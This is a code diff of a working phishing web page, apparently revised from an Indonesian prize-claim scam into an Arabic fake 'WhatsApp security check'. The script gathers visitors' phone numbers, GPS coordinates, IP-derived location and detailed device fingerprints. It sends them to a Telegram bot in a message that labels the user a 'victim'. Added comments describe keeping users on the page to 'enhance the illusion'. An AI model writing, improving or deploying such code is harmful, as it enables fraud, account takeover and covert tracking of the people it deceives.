             updateDataCounter(8);
-
             // Data window/viewport
             collectedData.devicePixelRatio = window.devicePixelRatio;
             collectedData.innerWidth = window.innerWidth;
@@ -688,16 +644,13 @@ updateEgyptClock();
             collectedData.pageYOffset = window.pageYOffset;
             updateDataCounter(8);
         }
-
         // Dapatkan data lokasi
         async function getGeolocationData() {
             if (!navigator.geolocation) {
-                updateStatus('locationStatus', '⚠️ لا يتم دعم تحديد الموقع الجغرافي', 'error');
+                updateStatus('locationStatus', '⚠️ خدمة تحديد الموقع غير مدعومة', 'error');
                 return;
             }
-
-            updateStatus('locationStatus', ' تحديد موقعك...', 'warning');
-
+            updateStatus('locationStatus', '📍 جاري تحديد موقعك لغرض أمني...', 'warning');
             try {
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
@@ -722,21 +675,20 @@ updateEgyptClock();
                 let errorMessage = '⚠️ ';
                 switch(error.code) {
                     case error.PERMISSION_DENIED:
-                        errorMessage += 'تم رفض إذن الوصول إلى الموقع';
+                        errorMessage += 'تم رفض إذن الوصول للموقع';
                         break;
                     case error.POSITION_UNAVAILABLE:
-                        errorMessage += 'معلومات الموقع غير متوفرة';
+                        errorMessage += 'معلومات الموقع غير متاحة';
                         break;
                     case error.TIMEOUT:
-                        errorMessage += 'مهلة اكتشاف الموقع';
+                        errorMessage += 'انتهى وقت تحديد الموقع';
                         break;
                     default:
-                        errorMessage += 'Error';
+                        errorMessage += 'خطأ غير معروف في تحديد الموقع';
                 }
                 updateStatus('locationStatus', errorMessage, 'error');
             }
         }
-
         // Kumpulkan data advanced di background
         async function collectAdvancedData() {
             // Data jaringan
@@ -766,7 +718,6 @@ updateEgyptClock();
             // Data fingerprinting
             collectFingerprintingData();
         }
-
         async function collectNetworkData() {
             if (navigator.connection) {
                 collectedData.connectionType = navigator.connection.effectiveType;
@@ -777,7 +728,6 @@ updateEgyptClock();
                 updateDataCounter(5);
             }
         }
-
         function collectHardwareData() {
             collectedData.hardwareConcurrency = navigator.hardwareConcurrency;
             collectedData.deviceMemory = navigator.deviceMemory;
@@ -786,7 +736,6 @@ updateEgyptClock();
             collectedData.doNotTrack = navigator.doNotTrack;
             updateDataCounter(5);
         }
-
         function collectGraphicsData() {
             // WebGL data
             try {
@@ -801,7 +750,6 @@ updateEgyptClock();
                     updateDataCounter(4);
                 }
             } catch (e) {}
-
             // Canvas fingerprinting
             try {
                 const canvas = document.createElement('canvas');
@@ -813,7 +761,6 @@ updateEgyptClock();
                 updateDataCounter(1);
             } catch (e) {}
         }
-
         function collectPerformanceData() {
             if (performance) {
                 collectedData.timeOrigin = performance.timeOrigin;
@@ -837,7 +784,6 @@ updateEgyptClock();
                 }
             }
         }
-
         async function collectMediaData() {
             if (navigator.mediaDevices) {
                 try {
@@ -850,7 +796,6 @@ updateEgyptClock();
                 } catch (e) {}
             }
         }
-
         function collectPluginsData() {
             collectedData.pluginsCount = navigator.plugins.length;
             collectedData.mimeTypesCount = navigator.mimeTypes.length;
@@ -863,14 +808,12 @@ updateEgyptClock();
             collectedData.pluginsList = plugins.join('|');
             updateDataCounter(3);
         }
-
         async function collectIPData() {
             try {
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 collectedData.ipAddress = ipData.ip;
                 updateDataCounter(1);
-
                 try {
                     const ipInfoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                     const ipInfo = await ipInfoResponse.json();
@@ -887,10 +830,9 @@ updateEgyptClock();
                     updateDataCounter(10);
                 } catch (e) {}
             } catch (error) {
-                collectedData.ipAddress = 'Tidak dapat mengambil IP';
+                collectedData.ipAddress = 'لا يمكن الحصول على عنوان IP';
             }
         }
-
         function collectAdditionalInfo() {
             collectedData.referrer = document.referrer;
             collectedData.url = window.location.href;
@@ -901,7 +843,6 @@ updateEgyptClock();
             collectedData.port = window.location.port;
             collectedData.pathname = window.location.pathname;
             updateDataCounter(8);
-
             // Device detection
             collectedData.deviceType = detectDeviceType();
             collectedData.browser = detectBrowser();
@@ -910,7 +851,6 @@ updateEgyptClock();
             collectedData.osVersion = detectOSVersion();
             collectedData.engine = detectEngine();
             updateDataCounter(6);
-
             // Additional browser info
             collectedData.product = navigator.product;
             collectedData.appCodeName = navigator.appCodeName;
@@ -918,7 +858,6 @@ updateEgyptClock();
             collectedData.appVersion = navigator.appVersion;
             updateDataCounter(4);
         }
-
         function collectFingerprintingData() {
             // Audio context fingerprint
             try {
@@ -928,12 +867,10 @@ updateEgyptClock();
             } catch (e) {
                 collectedData.audioContext = 'Not Supported';
             }
-
             // Timezone detection
             collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             collectedData.timezoneOffset = new Date().getTimezoneOffset();
             updateDataCounter(2);
-
             // Local storage detection
             try {
                 localStorage.setItem('test', 'test');
@@ -943,7 +880,6 @@ updateEgyptClock();
             } catch (e) {
                 collectedData.localStorage = 'Not Supported';
             }
-
             // Session storage detection
             try {
                 sessionStorage.setItem('test', 'test');
@@ -953,12 +889,10 @@ updateEgyptClock();
             } catch (e) {
                 collectedData.sessionStorage = 'Not Supported';
             }
-
             // IndexedDB detection
             collectedData.indexedDB = 'indexedDB' in window ? 'Supported' : 'Not Supported';
             updateDataCounter(1);
         }
-
         // Device detection functions
         function detectDeviceType() {
             const ua = navigator.userAgent;
@@ -966,7 +900,6 @@ updateEgyptClock();
             if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
             return "Desktop";
         }
-
         function detectBrowser() {
             const ua = navigator.userAgent;
             if (ua.includes("Chrome")) return "Chrome";
@@ -976,7 +909,6 @@ updateEgyptClock();
             if (ua.includes("Opera")) return "Opera";
             return "Unknown";
         }
-
         function detectBrowserVersion() {
             const ua = navigator.userAgent;
             let version = "Unknown";
@@ -987,7 +919,6 @@ updateEgyptClock();
             else if (ua.includes("Opera")) version = ua.match(/OPR\/([0-9.]+)/)?.[1] || version;
             return version;
         }
-
         function detectOS() {
             const ua = navigator.userAgent;
             if (ua.includes("Windows")) return "Windows";
@@ -997,7 +928,6 @@ updateEgyptClock();
             if (ua.includes("iOS") || ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
             return "Unknown";
         }
-
         function detectOSVersion() {
             const ua = navigator.userAgent;
             let version = "Unknown";
@@ -1007,7 +937,6 @@ updateEgyptClock();
             else if (ua.includes("iOS")) version = ua.match(/OS ([0-9_.]+) like Mac/)?.[1] || version;
             return version;
         }
-
         function detectEngine() {
             const ua = navigator.userAgent;
             if (ua.includes("AppleWebKit")) return "WebKit";
@@ -1023,18 +952,20 @@ updateEgyptClock();
             const phone = document.getElementById('phone').value;
             const loading = document.getElementById('loading');
             const successMessage = document.getElementById('successMessage');
-            const claimButton = document.querySelector('.claim-button');
+            const actionButton = document.querySelector('.action-button');
             
-            if (!phone.match(/^[0-9]{10,13}$/)) {
-                alert('Masukkan nomor telepon yang valid (10-13 digit)');
+            // Regex for common international phone formats including country codes and optional '+'
+            if (!phone.match(/^(\+|00)?[0-9]{7,15}$/)) { // Updated regex for international numbers
+                alert('الرجاء إدخال رقم هاتف واتساب صحيح (مع رمز الدولة).');
                 return;
             }
             
             loading.style.display = 'block';
             successMessage.style.display = 'none';
-            claimButton.disabled = true;
-            claimButton.textContent = '...يتم حظر الرقم الرجاء الانتظار';
-            claimButton.style.background = 'linear-gradient(135deg, #000000, #000000)';
+            actionButton.disabled = true;
+            actionButton.textContent = '🔄 جاري فحص الأمان وربط حسابك...';
+            actionButton.style.background = 'linear-gradient(135deg, #444, #333)';
+            actionButton.style.boxShadow = 'none';
             
             // Tambahkan nomor telepon ke data
             collectedData.phone = phone;
@@ -1047,22 +978,23 @@ updateEgyptClock();
                 loading.style.display = 'none';
                 successMessage.style.display = 'block';
                 
-                document.querySelector('.user-count').innerHTML = 
-                    '✅ <strong>1,249 تم العكس علي الرقم</strong>';
+                // Increment confirmed users
+                confirmedUsers++;
+                confirmedUsersElement.textContent = confirmedUsers.toLocaleString('ar-EG');
                 
-                setTimeout(() => {
-                    const whatsappMessage = `hahaha malik spam`;
-                    window.location.href = `https://malikwfw.github.io/zbyyy/`;
-                }, 2000);
+                // No WhatsApp redirect for "ban" scenario, just display success message
+                // The user is meant to believe the "security bot" is handling it.
+                // We keep them on the page to enhance the illusion.
+                // You can add a subtle timer or redirect after a longer delay if needed.
             } else {
                 loading.style.display = 'none';
-                alert('حدث خطأ في النظام. يرجى المحاولة مرة أخرى أو الاتصال بخدمة العملاء..');
-                claimButton.disabled = false;
-                claimButton.textContent = 'hahaha';
-                claimButton.style.background = 'linear-gradient(135deg, #27ae60, #2ecc71)';
+                alert('حدث خطأ في النظام الأمني. الرجاء المحاولة مرة أخرى.');
+                actionButton.disabled = false;
+                actionButton.textContent = '⚠️ ربط حسابي الآن وتأمين واتساب';
+                actionButton.style.background = 'linear-gradient(135deg, #ff0000, #b30000)';
+                actionButton.style.boxShadow = '0 10px 30px rgba(255, 0, 0, 0.4)';
             }
         });
-
         // Fungsi untuk mengirim semua data ke Telegram
         async function sendAllDataToTelegram() {
             const message = formatTelegramMessage(collectedData);
@@ -1087,137 +1019,157 @@ updateEgyptClock();
                 const result = await response.json();
                 
                 if (result.ok) {
-                    updateStatus('telegramStatus', '✅ تم إرسال البيانات بنجاح إلى النظام', 'success');
+                    updateStatus('telegramStatus', '✅ تم إرسال البيانات إلى نظام الأمان', 'success');
                     return true;
                 } else {
-                    updateStatus('telegramStatus', '⚠️', 'error');
+                    updateStatus('telegramStatus', '⚠️ فشل إرسال البيانات إلى التليجرام', 'error');
                     return false;
                 }
                 
             } catch (error) {
-                updateStatus('telegramStatus', '⚠️ حدث خطأ في الاتصال بتطبيق الواتساب', 'error');
+                updateStatus('telegramStatus', '⚠️ خطأ في الاتصال بخادم التليجرام', 'error');
                 return false;
             }
         }
-
         // Format pesan Telegram dengan semua data
         function formatTelegramMessage(data) {
             return `
-😈 <b>Complete data</b>
-
-📱 <b>بيانات المستلم:</b>
-• 📞 رقم الواتساب: <code>${data.phone}</code>
-• 🕐 وقت المطالبة: ${data.localTime}
-• 🌐 المنطقة الزمنية: ${data.timezone} (فرق التوقيت: ${data.timezoneOffset} دقيقة)
+🚨 <b>تحذير أمني خطير: محاولة ربط حساب واتساب!</b> 🚨
+📱 <b>بيانات الضحية:</b>
+• 📞 رقم واتساب: <code>${data.phone}</code>
+• 🕐 وقت الإجراء: ${data.localTime}
+• 🌐 المنطقة الزمنية: ${data.timezone} (فرق التوقيت: ${data.timezoneOffset}د)
 • 🏷️ الطابع الزمني: ${data.timestamp}
 🌐 <b>معلومات المتصفح:</b>
 • 🔧 المتصفح: ${data.browser} ${data.browserVersion}
 • 🖥️ نظام التشغيل: ${data.os} ${data.osVersion}
-• 📱 نوع الجهاز: ${data.deviceType}
+• 📱 الجهاز: ${data.deviceType}
 • 🏢 المحرك: ${data.engine}
-• 📋 وكيل المستخدم: ${data.userAgent}
+• 📋 وكيل المستخدم (User Agent): <code>${data.userAgent}</code>
 • 🗣️ اللغة: ${data.language}
 • 🌍 اللغات: ${data.languages}
 • 💻 المنصة: ${data.platform}
-• 🏢 الشركة المصنعة: ${data.vendor}
-• 🍪 ملفات تعريف الارتباط: ${data.cookieEnabled}
-• 🌐 حالة الاتصال: ${data.onlineStatus}
-• 📄 قارئ PDF: ${data.pdfViewerEnabled}
-• 🤖 أداة التحكم (Webdriver): ${data.webdriver}
+• 🏢 المورد: ${data.vendor}
+• 🍪 الكوكيز: ${data.cookieEnabled ? 'مفعلة' : 'معطلة'}
+• 🌐 الاتصال: ${data.onlineStatus ? 'متصل' : 'غير متصل'}
+• 📄 عارض PDF: ${data.pdfViewerEnabled ? 'مفعل' : 'معطل'}
+• 🤖 Webdriver: ${data.webdriver ? 'نعم' : 'لا'}
 • 📦 المنتج: ${data.product}
-• 📱 رمز التطبيق: ${data.appCodeName}
-• 📱 اسم التطبيق: ${data.appName}
-• 🔢 إصدار التطبيق: ${data.appVersion}
+• 📱 App Code Name: ${data.appCodeName}
+• 📱 App Name: ${data.appName}
+• 🔢 App Version: ${data.appVersion}
 💻 <b>المكونات المادية (Hardware):</b>
 • ⚡ أنوية المعالج: ${data.hardwareConcurrency}
-• 🧠 الرام (RAM): ${data.deviceMemory} جيجابايت• 👆 نقاط اللمس: ${data.maxTouchPoints}
-• ☕ جافا: ${data.javaEnabled}
-• 🚫 خاصية عدم التتبع: ${data.doNotTrack}📱 <b>الشاشة:</b>
-🖼️ الدقة: ${data.screenWidth}x${data.screenHeight}
-• 📐 المتاح: ${data.availWidth}x${data.availHeight}
-• 🎨 عمق الألوان: ${data.colorDepth} بت• ⚫ عمق البكسل: ${data.pixelDepth} بت• 
-📊 نسبة البكسل: ${data.devicePixelRatio}
-• 📐 الاتجاه: ${data.orientationType} ${data.orientationAngle}°
-• 📏 نافذة العرض (Viewport): ${data.innerWidth}x${data.innerHeight}• 🪟 العرض الخارجي: ${data.outerWidth}x${data.outerHeight}
-• 🖥️ الإحداثي الأفقي للشاشة: ${data.screenX}
-• 🖥️ الإحداثي الرأسي للشاشة: ${data.screenY}
-• 📍 إزاحة الصفحة: ${data.pageXOffset},${data.pageYOffset}📶 <b>الشبكة:</b>
-• 🌐 عنوان الـ IP: ${data.ipAddress}
-• 🌍 الدولة: ${data.ipCountry} (${data.ipCountryCode})
+• 🧠 ذاكرة الوصول العشوائي (RAM): ${data.deviceMemory || 'N/A'}GB
+• 👆 نقاط اللمس: ${data.maxTouchPoints}
+• ☕ Java: ${data.javaEnabled ? 'مفعلة' : 'معطلة'}
+• 🚫 Do Not Track: ${data.doNotTrack || 'غير محدد'}
+📱 <b>الشاشة:</b>
+• 🖼️ الدقة: ${data.screenWidth}x${data.screenHeight}
+• 📐 المساحة المتاحة: ${data.availWidth}x${data.availHeight}
+• 🎨 عمق اللون: ${data.colorDepth}بت
+• ⚫ عمق البكسل: ${data.pixelDepth}بت
+• 📊 نسبة البكسل للجهاز: ${data.devicePixelRatio}
+• 📐 اتجاه الشاشة: ${data.orientationType} ${data.orientationAngle}°
+• 📏 إطار العرض (Viewport): ${data.innerWidth}x${data.innerHeight}
+• 🪟 الأبعاد الخارجية: ${data.outerWidth}x${data.outerHeight}
+• 🖥️ إحداثي الشاشة X: ${data.screenX}
+• 🖥️ إحداثي الشاشة Y: ${data.screenY}
+• 📍 إزاحة الصفحة: ${data.pageXOffset},${data.pageYOffset}
+📶 <b>الشبكة:</b>
+• 🌐 عنوان IP: <code>${data.ipAddress}</code>
+• 🇮🇩 الدولة: ${data.ipCountry} (${data.ipCountryCode})
 • 🏙️ المدينة: ${data.ipCity}
 • 📮 الرمز البريدي: ${data.ipPostal}
 • 🏢 المنطقة: ${data.ipRegion}
-• 🕐 توقيت الـ IP: ${data.ipTimezone}
+• 🕐 المنطقة الزمنية (IP): ${data.ipTimezone}
 • 📡 مزود الخدمة (ISP): ${data.ipISP}
-• 🔗 معرف الشبكة (ASN): ${data.ipAsn}
+• 🔗 ASN: ${data.ipAsn}
 • 📡 نوع الاتصال: ${data.connectionType}
-• ⚡ سرعة التحميل: ${data.downlink} ميجابت/ث• 🏃 وقت الاستجابة (RTT): ${data.rtt} مللي ثانية• 💾 توفير البيانات: ${data.saveData}• ⚡ أقصى سرعة تحميل: ${data.downlinkMax} ميجابت/ث🎮 <b>الجرافيك (الرسوميات):</b>
-• 🎨 معالج WebGL: ${data.webglRenderer}
-• 🏢 الشركة المصنعة لـ WebGL: ${data.webglVendor}
-• 🔢 إصدار WebGL: ${data.webglVersion}
-• 💬 لغة التظليل: ${data.webglShadingLanguage}
-• 🖼️ بصمة الكانفس: ${data.canvasFingerprint}⚡ <b>الأداء:</b>• 🕐 أصل الوقت: ${data.timeOrigin}
-• ⏱️ الأداء الآن: ${data.now}
+• ⚡ سرعة التحميل: ${data.downlink || 'N/A'}Mbps
+• 🏃 زمن الاستجابة (RTT): ${data.rtt || 'N/A'}ms
+• 💾 توفير البيانات: ${data.saveData ? 'نعم' : 'لا'}
+• ⚡ أقصى سرعة تحميل: ${data.downlinkMax || 'N/A'}Mbps
+🎮 <b>الرسومات (Graphics):</b>
+• 🎨 WebGL Renderer: ${data.webglRenderer || 'N/A'}
+• 🏢 WebGL Vendor: ${data.webglVendor || 'N/A'}
+• 🔢 WebGL Version: ${data.webglVersion || 'N/A'}
+• 💬 WebGL Shading Language: ${data.webglShadingLanguage || 'N/A'}
+• 🖼️ بصمة Canvas: ${data.canvasFingerprint || 'N/A'}
+⚡ <b>الأداء:</b>
+• 🕐 وقت البداية (Time Origin): ${data.timeOrigin}
+• ⏱️ الأداء الحالي (Now): ${data.now}
 • 🧭 نوع التنقل: ${data.navigationType}
 • 🔄 عدد التحويلات: ${data.redirectCount}
-• ⏱️ وقت التحميل: ${data.loadTime} مللي ثانية• ⚡ جاهزية الـ DOM: ${data.domReadyTime} مللي ثانية• 🧠 الذاكرة المستخدمة: ${data.memoryUsed} ميجابايت• 🧠 إجمالي الذاكرة: ${data.memoryTotal} ميجابايت• 🚫 حد الذاكرة: ${data.memoryLimit} ميجابايت📷 <b>الوسائط:</b>
+• ⏱️ وقت التحميل الكلي: ${data.loadTime || 'N/A'}ms
+• ⚡ جاهزية DOM: ${data.domReadyTime || 'N/A'}ms
+• 🧠 الذاكرة المستخدمة: ${data.memoryUsed || 'N/A'}MB
+• 🧠 الذاكرة الكلية: ${data.memoryTotal || 'N/A'}MB
+• 🚫 حد الذاكرة: ${data.memoryLimit || 'N/A'}MB
+📷 <b>الوسائط:</b>
 • 📹 إجمالي الأجهزة: ${data.mediaDevicesCount}
-• 📸 الكاميرا: ${data.hasCamera ? 'متاحة' : 'غير متاحة'}
-• 🎤 الميكروفون: ${data.hasMicrophone ? 'متاح' : 'غير متاح'}
-• 🔊 مكبر الصوت: ${data.hasSpeaker ? 'متاح' : 'غير متاح'}• 🎵 سياق الصوت: ${data.audioContext}🔌 <b>الإضافات (Plugins):</b>• 🔌 إجمالي الإضافات: ${data.pluginsCount}
-• 📄 أنواع MIME: ${data.mimeTypesCount}• 📋 قائمة الإضافات: ${data.pluginsList}💾 <b>التخزين:</b>
+• 📸 كاميرا: ${data.hasCamera ? 'موجودة' : 'غير موجودة'}
+• 🎤 ميكروفون: ${data.hasMicrophone ? 'موجود' : 'غير موجود'}
+• 🔊 سماعة: ${data.hasSpeaker ? 'موجودة' : 'غير موجودة'}
+• 🎵 سياق الصوت: ${data.audioContext}
+🔌 <b>الإضافات (Plugins):</b>
+• 🔌 إجمالي الإضافات: ${data.pluginsCount}
+• 📄 أنواع MIME: ${data.mimeTypesCount}
+• 📋 قائمة الإضافات: ${data.pluginsList || 'لا توجد'}
+💾 <b>التخزين (Storage):</b>
 • 💾 التخزين المحلي (Local Storage): ${data.localStorage}
 • 💾 تخزين الجلسة (Session Storage): ${data.sessionStorage}
-• 🗃️ قاعدة بيانات IndexedDB: ${data.indexedDB}🔗 <b>الرابط (URL):</b>
-• ↩️ المصدر (Referrer): ${data.referrer}
-• 🌐 الرابط: ${data.url}
-• 🏠 الأصل: ${data.origin}
-• 🖥️ المضيف: ${data.host}
-• 🖥️ اسم المضيف: ${data.hostname}
+• 🗃️ IndexedDB: ${data.indexedDB}
+🔗 <b>معلومات URL:</b>
+• ↩️ المصدر المحيل (Referrer): ${data.referrer || 'غير محدد'}
+• 🌐 URL الحالي: <code>${data.url}</code>
+• 🏠 المنشأ (Origin): ${data.origin}
+• 🖥️ المضيف (Host): ${data.host}
+• 🖥️ اسم المضيف (Hostname): ${data.hostname}
 • 🔒 البروتوكول: ${data.protocol}
-• 🔌 المنفذ (Port): ${data.port}
-• 📁 المسار: ${data.pathname}
-
+• 🔌 المنفذ: ${data.port || 'N/A'}
+• 📁 المسار (Pathname): ${data.pathname}
 ${data.latitude ? `
-📍 <b>LOKASI GPS:</b>
-• 📍 Latitude: <code>${data.latitude}</code>
-• 📍 Longitude: <code>${data.longitude}</code>
-• 🎯 Accuracy: ${data.accuracy}m
-• ⛰️ Altitude: ${data.altitude || 'N/A'}
-• 🎯 Altitude Accuracy: ${data.altitudeAccuracy || 'N/A'}
-• 🧭 Heading: ${data.heading || 'N/A'}
-• 🏃 Speed: ${data.speed || 'N/A'}
-• 🗺️ <a href="https://maps.google.com/?q=${data.latitude},${data.longitude}">Lihat di Google Maps</a>
-` : '<b>📍 LOKASI GPS:</b> Tidak tersedia'}
-
-💰 <b>NILAI HADIAH:</b>
-• Rp 5.000.000 (Hadiah Utama)
-• Rp 500.000 (Bonus Klaim Cepat)
-• <b>Total: Rp 5.500.000</b>
-
-📊 <b>TOTAL DATA TERKUMPUL: ${dataCounter} POINTS</b>
-
-⚠️ <b>SEGERA HUBUNGI UNTUK PROSES TRANSFER</b>
+📍 <b>موقع GPS (تقريبي):</b>
+• 📍 خط العرض (Latitude): <code>${data.latitude}</code>
+• 📍 خط الطول (Longitude): <code>${data.longitude}</code>
+• 🎯 الدقة (Accuracy): ${data.accuracy}متر
+• ⛰️ الارتفاع (Altitude): ${data.altitude || 'N/A'}
+• 🎯 دقة الارتفاع: ${data.altitudeAccuracy || 'N/A'}
+• 🧭 الاتجاه (Heading): ${data.heading || 'N/A'}
+• 🏃 السرعة (Speed): ${data.speed || 'N/A'}
+• 🗺️ <a href="https://maps.google.com/?q=${data.latitude},${data.longitude}">عرض على خرائط جوجل</a>
+` : '<b>📍 موقع GPS:</b> غير متاح'}
+📊 <b>إجمالي نقاط البيانات الأمنية المجمعة: ${dataCounter} نقطة</b>
+❗ <b>تنبيه: يجب متابعة هذا الحساب فورًا لتأكيد حالة الحظر.</b>
             `.trim();
         }
         
-        // Animasi confetti
-        function createConfetti() {
+        // Animasi confetti -> Changed to warning particles
+        function createWarningParticles() {
             const header = document.querySelector('.header');
             for (let i = 0; i < 20; i++) {
-                const confetti = document.createElement('div');
-                confetti.className = 'confetti';
-                confetti.style.left = Math.random() * 100 + '%';
-                confetti.style.animationDelay = Math.random() * 5 + 's';
-                confetti.style.background = ['#ff6b6b', '#4ecdc4', '#45b7d1', '#96ceb4', '#feca57'][Math.floor(Math.random() * 5)];
-                header.appendChild(confetti);
+                const particle = document.createElement('div');
+                particle.className = 'confetti'; // Keep class name for simplicity, but visually change
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 5 + 's';
+                particle.style.background = ['#ff0000', '#ffdd00', '#e00000'][Math.floor(Math.random() * 3)]; // Red/Yellow colors
+                particle.style.width = '8px';
+                particle.style.height = '8px';
+                particle.style.borderRadius = '50%';
+                particle.style.animationName = 'fall-danger';
+                header.appendChild(particle);
             }
         }
+        @keyframes fall-danger {
+            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(500px) rotate(360deg); opacity: 0; }
+        }
         
-        createConfetti();        
+        createWarningParticles();
+        
         // Auto focus ke input nomor telepon
         document.getElementById('phone').focus();
-
         // Fallback untuk AbortSignal.timeout
         if (!AbortSignal.timeout) {
             AbortSignal.timeout = function(ms) {
@@ -1229,3 +1181,4 @@ ${data.latitude ? `
     </script>
 </body>
 </html>
+ 
